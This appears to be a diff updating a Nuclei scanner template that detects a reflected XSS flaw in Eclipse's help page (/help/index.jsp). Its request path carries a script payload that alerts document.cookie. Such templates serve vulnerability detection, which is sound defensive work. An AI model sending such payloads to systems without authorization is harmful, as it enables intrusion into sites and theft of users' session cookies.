@@ -1,11 +1,12 @@
-id: Eclipse XSS
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
+id: Eclipse-XSS
 
 info:
   name: Eclipse Reflected XSS vulnerability
   author: pikpikcu
   severity: medium
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/help/index.jsp?view=<script>alert(document.cookie)</script>"
